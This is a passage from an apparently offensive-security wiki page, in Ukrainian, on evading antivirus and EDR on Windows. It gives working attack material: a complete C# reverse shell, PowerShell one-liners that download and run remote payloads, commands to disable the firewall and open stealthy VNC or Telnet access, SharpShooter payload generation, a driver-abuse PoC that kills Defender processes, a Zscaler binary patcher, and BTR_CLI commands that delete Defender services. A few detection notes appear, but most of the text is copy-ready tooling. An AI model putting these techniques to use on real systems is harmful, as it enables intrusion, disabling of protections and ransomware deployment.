Це має виконуватися після instruction selection та optimization, оскільки трансформація повинна охоплювати **кожен** згенерований return і знати точне розташування x86. `MachineFunctionPass` перед генерацією коду знаходить останній `MachineInstr::isReturn()`, видаляє його, щоб фінальний шлях переходив до доданого epilogue, і замінює попередні return на `JMP_1 handler`. Зберігайте будь-яке згенероване компілятором очищення stack/frame перед кожним return; перенаправляйте лише саму return-інструкцію.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` і `X86AsmPrinter::emitFunctionBodyEnd()` генерують per-function stubs, тоді як `emitEndOfAsmFile()` генерує handler. Символи, спільні між етапами генерації, дають змогу гілці prologue переходити до подальшого epilogue; для manually emitted near `je` запишіть `0F 84`, після чого чотирибайтний MC expression `target - address_after_je`. Calls і jumps до handler натомість можна генерувати як об’єкти `MCInst` (`CALL64pcrel32` і `JMP_1`). Pass має повертати `false` для невибраної функції, якщо він нічого не змінив; PoC помилково повертає `true` на цьому шляху.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata та ініціалізація до CRT

PoC розміщує XOR-ключ і 16-байтні записи, що містять loader-relocated покажчик на функцію та runtime length, у `.funcmeta`. Хоча C-поле має тип `uint32_t`, handler звертається до QWORD за зміщенням `+8` у записі, споживаючи length і його padding, та переходить до наступних записів із кроком `0x10`. Назви PE-секцій мають лише вісім байтів, тому runtime lookup бачить `.funcmet`. Зовнішній patcher додає executable-секцію `.stub`, зберігає старий entry-point RVA у stub і перенаправляє `AddressOfEntryPoint`; PIC stub отримує image base з `gs:[0x60]` → `[PEB+0x10]`, проходить PE32+ imports для resolution вже імпортованого `VirtualProtect` і запускається до CRT.<sup>[[38]](#references)[[39]](#references)</sup>

Ініціалізація встановлює sentinel у `gs:[0xE8]` і викликає кожну metadata-функцію. Її постійно доступний для читання prologue записує початок функції в `gs:[0xF0]`, виявляє sentinel і пропускає ще не замасковане тіло. Потім epilogue використовує `call handler`; після того як handler зберігає 13 регістрів (`0x68` bytes), адреса повернення за `[rsp+0x68]` є кінцем transformed function, тому `end - start` можна записати до її metadata-запису. Stub очищає sentinel і переходить до `ImageBase + original_entry_point_RVA` після маскування всіх тіл.<sup>[[38]](#references)[[39]](#references)</sup>

Під час звичайного call prologue викликає той самий symmetric handler для декодування тіла. Фінальний шлях переходить до доданого epilogue, тоді як кожен попередній return переходить безпосередньо до спільного handler. Звичайний epilogue також використовує `jmp handler`, а не `call`, тому після повторного маскування `ret` handler споживає адресу повернення початкового caller і зберігає результат функції в `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Примітив маскування та indicators для аналізу

Handler знаходить поточний запис, пропускає фіксований видимий prologue (`0x46` bytes у цій збірці), змінює права решти на `PAGE_EXECUTE_READWRITE`, виконує побайтний XOR із молодшим байтом ключа, а потім встановлює `PAGE_EXECUTE_READ`. Отже, той самий loop декодує дані під час entry і кодує їх під час кожного звичайного exit.<sup>[[38]](#references)[[39]](#references)</sup>

До high-signal indicators цього дизайну належать:<sup>[[38]](#references)[[39]](#references)</sup>

- entry point усередині executable `.stub` і секція `.funcmet`, що містить ключ і relocated pointers на `.text`;
- parsing PEB, import table і section table до CRT, після чого виконуються calls через кожен metadata pointer;
- ідентичні `call`/`pop` PIC prologues і численні return sites, перенаправлені до одного handler;
- записи до `gs:[0xE8]`, `gs:[0xF0]` і `gs:[0xF8]`, за якими йдуть повторювані переходи `VirtualProtect` і побайтні XOR-записи до executable pages, backed by image.

Це ухилення від memory scanner, а не cryptographic protection: patched file все ще містить оригінальне незашифроване тіло, а debugger може встановити breakpoint на `VirtualProtect` або XOR loop і зберегти активну функцію. Однобайтний XOR, доступні для читання metadata та фіксована межа `0x46` також спрощують offline recovery.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> TEB slots у PoC є thread-local, але модифіковані code pages є process-wide. Тому concurrent або recursive entry може повторно перемикати інструкції, поки інший invocation їх виконує; exceptions і nonlocal exits також можуть обійти повторне маскування. Надійна реалізація має синхронізувати transitions, відновлювати protection, фактично повернутий через `lpflOldProtect`, уникати hard-coded довжин stub, перевіряти обидва шляхи `call` і `jmp` щодо вирівнювання stack у x64 та викликати `FlushInstructionCache` після перезапису executable bytes. Microsoft прямо покладає на caller відповідальність за узгодженість instruction cache під час модифікації executable code.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Можливо, ви вже бачили цей екран під час завантаження деяких виконуваних файлів з інтернету та їх запуску.

Microsoft Defender SmartScreen — це механізм безпеки, призначений для захисту кінцевого користувача від запуску потенційно шкідливих застосунків.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen переважно працює на основі reputation-based підходу, тобто незвичні завантажені застосунки активують SmartScreen, який попереджає кінцевого користувача та не дає йому виконати файл (хоча файл усе ще можна запустити, натиснувши More Info -> Run anyway).

**MoTW** (Mark of The Web) — це [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) з назвою Zone.Identifier, який автоматично створюється під час завантаження файлів з інтернету разом із URL, з якого файл було завантажено.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Перевірка Zone.Identifier ADS для файлу, завантаженого з інтернету.</p></figcaption></figure>

> [!TIP]
> Важливо зазначити, що виконувані файли, підписані **trusted** signing certificate, **не активують SmartScreen**.

Дуже ефективний спосіб запобігти отриманню вашими payload Mark of The Web — запакувати їх у контейнер, наприклад ISO. Це відбувається тому, що Mark-of-the-Web (MOTW) **не може** бути застосований до томів, які **не використовують NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) — це tool, який пакує payload у вихідні контейнери для обходу Mark-of-the-Web.

Приклад використання:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Ось демонстрація обходу SmartScreen шляхом пакування payloads в ISO-файли за допомогою [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) — це потужний механізм журналювання у Windows, який дає змогу застосункам і системним компонентам **журналювати події**. Однак його також можуть використовувати security products для моніторингу та виявлення malicious activities.

Так само як вимикається (обходиться) AMSI, можна змусити функцію **`EtwEventWrite`** user space process негайно повертати результат без журналювання будь-яких подій. Це робиться шляхом patching функції в пам'яті, щоб вона одразу повертала результат, фактично вимикаючи ETW logging для цього process.

Більше інформації можна знайти тут: **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) та [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Завантаження C# binaries у пам'ять відоме вже досить давно й досі є чудовим способом запускати свої post-exploitation tools, не привертаючи уваги AV.

Оскільки payload буде завантажено безпосередньо в пам'ять, не торкаючись диска, нам потрібно буде подбати лише про patching AMSI для всього process.

Більшість C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc тощо) вже надають можливість виконувати C# assemblies безпосередньо в пам'яті, але існують різні способи це зробити:

- **Fork\&Run**

Цей підхід передбачає **створення нового sacrificial process**, injection вашого post-exploitation malicious code у цей новий process, виконання malicious code і завершення нового process після цього. Він має як переваги, так і недоліки. Перевага fork and run полягає в тому, що виконання відбувається **за межами** нашого Beacon implant process. Це означає, що якщо щось піде не так під час post-exploitation action або буде виявлено, існує **значно більша ймовірність**, що наш **implant залишиться працювати**. Недолік полягає в тому, що існує **більша ймовірність** бути виявленим **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Це injection post-exploitation malicious code **у власний process**. Таким чином можна уникнути створення нового process і його сканування AV, але недоліком є те, що якщо під час виконання payload щось піде не так, існує **значно більша ймовірність** **втратити beacon**, оскільки він може аварійно завершити роботу.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Якщо ви хочете дізнатися більше про завантаження C# Assembly, перегляньте цю статтю [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) і їхній InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Ви також можете завантажувати C# Assemblies **з PowerShell**. Перегляньте [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) і [відео S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Як запропоновано в [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), можна виконувати malicious code за допомогою інших мов, надавши скомпрометованій машині доступ **до interpreter environment, встановленого на Attacker Controlled SMB share**.

Надавши доступ до Interpreter Binaries та environment на SMB share, можна **виконувати довільний код цими мовами в пам'яті** скомпрометованої машини.

У репозиторії зазначено: Defender усе ще сканує scripts, але використання Go, Java, PHP тощо дає нам **більше гнучкості для обходу static signatures**. Тестування випадкових не обфускованих reverse shell scripts цими мовами виявилося успішним.

## TokenStomping

Token stomping маніпулює access token security product, наприклад EDR або AV. Зменшення привілеїв token може залишити process запущеним, водночас не даючи йому виконувати privileged inspection або remediation actions.

Щоб запобігти цьому, Windows могла б **заборонити external processes** отримувати handles до tokens security processes.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Як описано в [**цьому дописі в блозі**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), легко просто розгорнути Chrome Remote Desktop на PC жертви, а потім використовувати його для takeover і підтримання persistence:<sup>[[35]](#references)</sup>
1. Завантажте його з https://remotedesktop.google.com/, натисніть "Set up via SSH", а потім натисніть MSI-файл для Windows, щоб завантажити MSI-файл.
2. Тихо запустіть installer на машині жертви (потрібні права адміністратора): `msiexec /i chromeremotedesktophost.msi /qn`
3. Поверніться на сторінку Chrome Remote Desktop і натисніть next. Майстер попросить вас авторизуватися; натисніть кнопку Authorize, щоб продовжити.
4. Виконайте надану command із необхідними змінами: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (параметр `--pin` встановлює PIN без використання GUI).


## Advanced Evasion

Evasion — дуже складна тема. Іноді потрібно враховувати багато різних джерел telemetry в одній системі, тому в зрілих environments майже неможливо залишатися повністю непомітним.

Кожне environment, проти якого ви дієте, матиме власні сильні та слабкі сторони.

Настійно рекомендую переглянути цей виступ [@ATTL4S](https://twitter.com/DaniLJ94), щоб отримати базове розуміння більш Advanced Evasion techniques.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Це також чудовий виступ [@mariuszbit](https://twitter.com/mariuszbit) про Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Перевірка, які частини Defender знаходить malicious**

Можна використовувати [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), який **видалятиме частини binary**, доки **не визначить, яку саме частину Defender** вважає malicious, і покаже її вам.\
Інший tool, що робить **те саме, —** [**avred**](https://github.com/dobin/avred), із відкритим web-сервісом за адресою [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

До Windows10 усі версії Windows постачалися з **Telnet server**, який можна було встановити (як administrator), виконавши:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Зробіть так, щоб він **запускався** під час запуску системи, і **запустіть** його зараз:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Змінити порт telnet (stealth) і вимкнути firewall:**
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Завантажте його звідси: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (потрібні завантаження bin, а не setup)

**НА ХОСТІ**: Запустіть _**winvnc.exe**_ і налаштуйте сервер:

- Увімкніть опцію _Disable TrayIcon_
- Установіть пароль у _VNC Password_
- Установіть пароль у _View-Only Password_

Потім перемістіть бінарний файл _**winvnc.exe**_ і **щойно** створений файл _**UltraVNC.ini**_ на **жертву**

#### **Reverse connection**

**Атакувальник** має **запустити всередині** свого **хоста** бінарний файл `vncviewer.exe -listen 5900`, щоб він був **готовий** прийняти зворотне **VNC-з'єднання**. Потім на **жертві**: запустіть daemon winvnc `winvnc.exe -run` і виконайте `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ПОПЕРЕДЖЕННЯ:** Для збереження прихованості не слід робити кілька речей

- Не запускайте `winvnc`, якщо він уже працює, інакше з'явиться [спливаюче вікно](https://i.imgur.com/1SROTTl.png). Перевірте, чи він запущений, за допомогою `tasklist | findstr winvnc`
- Не запускайте `winvnc` без `UltraVNC.ini` у тому самому каталозі, інакше відкриється [вікно конфігурації](https://i.imgur.com/rfMQWcf.png)
- Не запускайте `winvnc -h` для отримання довідки, інакше з'явиться [спливаюче вікно](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Завантажте його звідси: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Усередині GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Тепер **запустіть lister** за допомогою `msfconsole -r file.rc` і **виконайте** **xml payload** за допомогою:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Поточний Defender дуже швидко завершить процес.**

### Компіляція власного reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Перший C# Revershell

Скомпілюйте його за допомогою:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Використовуйте це з:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# із використанням компілятора
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Автоматичне завантаження та виконання:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Список C# obfuscators: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Приклад використання python для створення injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Інші інструменти
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Більше

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Знищення AV/EDR із простору ядра

Storm-2603 використовувала невелику консольну утиліту під назвою **Antivirus Terminator**, щоб вимкнути endpoint-захист перед розгортанням ransomware. Інструмент постачається з **власним вразливим, але *підписаним* драйвером** і зловживає ним для виконання привілейованих операцій у ядрі, які не можуть заблокувати навіть AV-сервіси Protected-Process-Light (PPL).<sup>[[12]](#references)</sup>

Основні висновки
1. **Підписаний драйвер**: файл, що доставляється на диск, має назву `ServiceMouse.sys`, але бінарний файл є легітимно підписаним драйвером `AToolsKrnl64.sys` із “System In-Depth Analysis Toolkit” від Antiy Labs. Оскільки драйвер має дійсний підпис Microsoft, він завантажується навіть за ввімкненого Driver-Signature-Enforcement (DSE).
2. **Встановлення сервісу**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Перший рядок реєструє драйвер як **сервіс ядра**, а другий запускає його, щоб `\\.\ServiceMouse` став доступним із user land.
3. **IOCTL, які надає драйвер**
| Код IOCTL | Можливість                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Завершення довільного процесу за PID (використовується для знищення сервісів Defender/EDR) |
| `0x990000D0` | Видалення довільного файлу з диска |
| `0x990001D0` | Вивантаження драйвера та видалення сервісу |

Мінімальний C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Чому це працює**:  BYOVD повністю обходить user-mode-захист; код, що виконується в ядрі, може відкривати *захищені* процеси, завершувати їх або втручатися в об’єкти ядра незалежно від PPL/PP, ELAM чи інших функцій hardening.

Виявлення / Mitigation
•  Увімкніть Microsoft vulnerable-driver block list (`HVCI`, `Smart App Control`), щоб Windows відмовлялася завантажувати `AToolsKrnl64.sys`.
•  Відстежуйте створення нових *kernel* сервісів і створюйте сповіщення, коли драйвер завантажується зі спільного для запису каталогу або відсутній у allow-list.
•  Відстежуйте user-mode handles до custom device objects, після яких виконуються підозрілі виклики `DeviceIoControl`.

### Обхід Posture Checks Zscaler Client Connector за допомогою патчингування бінарних файлів на диску

**Client Connector** від Zscaler локально застосовує правила device-posture і використовує Windows RPC для передавання результатів іншим компонентам. Два слабкі рішення в дизайні роблять повний обхід можливим:

1. Оцінювання posture відбувається **повністю на стороні клієнта** (на сервер надсилається boolean).
2. Внутрішні RPC endpoints перевіряють лише те, що виконуваний файл, який підключається, **підписаний Zscaler** (через `WinVerifyTrust`).<sup>[[11]](#references)</sup>

За допомогою **патчингування чотирьох підписаних бінарних файлів на диску** обидва механізми можна нейтралізувати:

| Бінарний файл | Оригінальна логіка, яку пропатчено | Результат |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Завжди повертає `1`, тому кожна перевірка вважається пройденою |
| `ZSAService.exe` | Непрямий виклик `WinVerifyTrust` | Замінено на NOP ⇒ будь-який процес (навіть непідписаний) може підключатися до RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Замінено на `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Перевірки цілісності tunnel | Обхід виконання перевірок |

Фрагмент мінімального patcher:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Після заміни оригінальних файлів і перезапуску service stack:

* **Усі** posture checks відображаються як **green/compliant**.
* Unsigned або modified binaries можуть відкривати named-pipe RPC endpoints (наприклад, `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Compromised host отримує unrestricted access до internal network, визначеної політиками Zscaler.

Цей case study демонструє, як суто client-side trust decisions і прості signature checks можна обійти за допомогою кількох byte patches.

## Зловживання trusted functionality Microsoft Defender `BTR.sys`

Драйвер Defender **Boot-Time Removal** є корисним контрприкладом класичному BYOVD. `BTR.sys` — легітимний Microsoft-signed remediation component без memory-corruption bug і без IOCTL interface; після отримання administrator access і `SeLoadDriverPrivilege` оператор натомість може підробити його private remediation transaction і отримати передбачені Ring-0 file/registry operations. Це **post-compromise AV/EDR-neutralization primitive, а не initial access або privilege escalation**, причому драйвер можна витягти з власного `MpEngine.dll` цільової системи, з ресурсу `BOOTTIMETOOL`, замість імпортувати помітний third-party driver.<sup>[[36]](#references)</sup>

### Підготовка one-shot driver

Зазвичай Defender зберігає resource як файл із випадковою назвою `[a-z]{8}.sys` і реєструє kernel service із подібною назвою. `DriverEntry` читає значення `Args` service, відкриває вказаний NTFS ADS, розшифровує та перевіряє action list, записує feedback і після успішного виконання повертає `0xC0000056` (`STATUS_DELETE_PENDING`), щоб driver вивантажився, а не залишався resident. Forged service має такі characteristic values.<sup>[[36]](#references)[[37]](#references)</sup>
```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```
Потік `:changelist` містить один зашифрований RC4 blob. Проаналізовані збірки повторно використовують фіксований 256-байтовий ключ, тому шифрування не є межею авторизації. Валідний plaintext має глобальний заголовок розміром 24 байти (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC заголовка та ідентифікатор транзакції, похідний від payload), після якого містяться null-terminated UTF-16 шлях feedback і довільна кількість елементів. Кожен елемент має 16-байтовий заголовок (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) і дані, специфічні для action, що завершуються **рівно чотирма NUL-байтами**. Кожна область заголовка/даних перевіряється окремо за допомогою CRC-32 polynomial `0xEDB88320`, з початковим станом `0xFFFFFFFF` і **без фінального XOR** (`~CRC32`); стан CRC скидається для кожної області.<sup>[[36]](#references)[[37]](#references)</sup>

Прийняті ID action відкривають доступ до цих kernel primitives.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Item data | Result |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Видалити файл, зокрема locked file |
| 2 | `[UTF-16 path]` | Видалити порожню директорію |
| 3 | `[Flags][source][destination]` | Перемістити файл у вибраний attacker-ом protected path; порожній destination означає видалення |
| 4 | `[Flags][key path]` | Рекурсивно видалити registry key |
| 5 | `[Flags][key path + "\\" + value]` | Видалити registry value |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Створити/оновити registry value і створити відсутні key paths |

Для action 5 і 6 on-wire роздільником key/value є **два послідовні зворотні слеші**; path у стандартному форматі не буде правильно розділено. Feedback file здебільшого віддзеркалює request, але перші чотири байти даних кожного елемента стають його результуючим `NTSTATUS`. Для action 1 і 2, які не мають початкового поля flags, BTR переміщує path у чотири зарезервовані кінцеві байти, щоб звільнити місце для цього status.<sup>[[36]](#references)</sup>

### Workflow `BTR_CLI` і вікно раннього завантаження

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) реалізує повний ланцюжок: витягує `BTR.sys` із локального Defender, створює `<random>.sys:changelist` і feedback stream, серіалізує/перевіряє checksum/шифрує chained actions, безпосередньо створює service registry key, а потім викликає `NtLoadDriver` для `-trigger now` або залишає його як system-start driver для `-trigger boot`. Пряме registry staging оминає стандартний шлях SCM `CreateServiceW` і тому **не створює** Event ID 7045 про інсталяцію service. Артефакти, запущені під час boot, згодом можна видалити за допомогою `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>
```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```
